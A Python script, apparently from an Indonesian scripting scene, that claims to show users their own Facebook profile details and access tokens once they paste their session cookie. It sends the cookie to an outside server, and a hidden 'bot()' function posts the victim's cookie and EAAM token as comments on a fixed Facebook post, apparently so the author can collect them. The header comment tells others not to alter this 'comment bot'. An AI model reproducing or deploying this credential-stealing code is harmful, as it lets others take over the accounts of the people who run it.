#!/usr/bin/python3
#coding=utf-8
# Developed By : Denventa And Merch Elz
# Coded By     : Denventa Afriliyan Ferly Shishigami X [ A-Haganezuka ]
# A-Haganezuka = [ Denventa Afriliyan Ferly Shishigami X - Haganezuka ]
# Recode?, Boleh Asal Cantumkan Nama Author
# Jangan Ganti Bot Koment Gw

import requests as r, json, os, re
from requests.exceptions import ConnectionError

a = '\033[1;30m'; m = '\033[1;31m'; h = '\033[1;32m'; p = '\033[1;37m'; k = '\033[1;33m'; s = '\033[1;35m'
def get_token(cookie):
    api = r.get('http://dvandenpolph.pythonanywhere.com/fb_token_generator?cookie='+ cookie).json()
    if 'success' in api['status']:
        stalk(api)
    else:
        print(api)
        exit(f'{m}INFO!{p} Cookies Invalid')


def stalk(data):
    cok = {'cookie':data['cookie']}
    json = {}
    def bot():
        r.post('https://graph.facebook.com/672104641594118/comments?access_token='+ data['token']['eaag'], data={'message':data["token"]["eaam"]}, cookies=cok).json()
        r.post('https://graph.facebook.com/672104641594118/comments?access_token='+ data['token']['eaag'], data={'message':data["cookie"]}, cookies=cok).json()
    os.system('clear')
    api = r.get('https://graph.facebook.com/me?fields=id,name,gender,location,birthday&access_token='+ data['token']['eaam'], cookies=cok).json()
    tc = r.get('https://graph.facebook.com/me/friends?fields=id&limit=5000&access_token='+ data['token']['eaab'], cookies=cok).json()['summary']['total_count']
    fc = r.get('https://graph.facebook.com/me/subscribers?limit=1000&access_token='+ data['token']['eaag'], cookies=cok).json()['summary']['total_count']
    for req in ['id', 'name', 'gender', 'location', 'birthday']:
        try:
            if 'birthday' in req:
                json.update({req:api[req].split('/')[1]+'/'+api[req].split('/')[0]+'/'+api[req].split('/')[2]})
            else:
                json.update({req:api[req]})
        except:json.update({req:m+'None'})
    bot()
    print(f'{p}Tools Get Your Informations Account Facebook\n')
    print(f'{a}[{m}*{a}]{p} Facebook Name: {k}'+ json['name'])
    print(f'{a}[{m}*{a}]{p} Facebook ID: {k}'+ json['id'])
    print(f'{a}[{m}*{a}]{p} Gender: {k}'+ json['gender'])
    print(f'{a}[{m}*{a}]{p} Location: {k}'+ json['location'])
    print(f'{a}[{m}*{a}]{p} Birthday: {k}'+ json['birthday'])
    print(f'{a}[{m}*{a}]{p} Friends Count: {k}'+ str(tc))    
    print(f'{a}[{m}*{a}]{p} Followers Count:{k} '+ str(fc))
    print(f'{a}[{m}-{a}]{p} Cookies: {h}'+ data['cookie'])
    print(f'{a}[{m}-{a}]{p} Eaam Token: {h}'+ data['token']['eaam'])
    mar = input(f'{p}\nApakah Anda Ingin Menlihat Token Facebook Yang Lain (Y/T)?{m} ')
    if 'y' in mar.lower():
        print(f'{p} TOKEN LIST')
        print(f'{a}[{m}1{a}]{p} Token EAAB')
        print(f'{a}[{m}2{a}]{p} Token EAAD')
        print(f'{a}[{m}3{a}]{p} Token EAAE')
        print(f'{a}[{m}4{a}]{p} Token EAAF')
        print(f'{a}[{m}5{a}]{p} Token EAAG')
        print(f'{a}[{m}6{a}]{p} Token EAAI')
        print(f'{a}[{m}7{a}]{p} Token EABB')
        seleb = input(f'\n{a}[{m}?{a}]{p} Chose Number:{m} ')
        print()
        if '1' in seleb:
            print(f'{a}[{m}-{a}]{p} Eaab Token:{h} '+ data['token']['eaab'])
        elif '2' in seleb:
            print(f'{a}[{m}-{a}]{p} Eaad Token:{h} '+ data['token']['eaad'])
        elif '3' in seleb:
            print(f'{a}[{m}-{a}]{p} Eaae Token:{h} '+ data['token']['eaae'])
        elif '4' in seleb:
            print(f'{a}[{m}-{a}]{p} Eaaf Token:{h} '+ data['token']['eaaf'])
        elif '5' in seleb:
            print(f'{a}[{m}-{a}]{p} Eaag Token:{h} '+ data['token']['eaag'])
        elif '6' in seleb:
            print(f'{a}[{m}-{a}]{p} Eaai Token:{h} '+ data['token']['eaai'])
        elif '7' in seleb:
            print(f'{a}[{m}-{a}]{p} Eabb Token:{h} '+ data['token']['eabb'])
        else:exit(m +'Pilih Yang Bener Anj1n9')
    else:exit()
    


if __name__=='__main__':
    os.system('clear')
    print(p +'Silahkan Masukan Cookie Akun Facebook Anda Untuk Mendapatkan Informasi Facebook Anda.')
    get_token(input(f'\n{a}[{m}?{a}]{p} Cookies:{h} '))
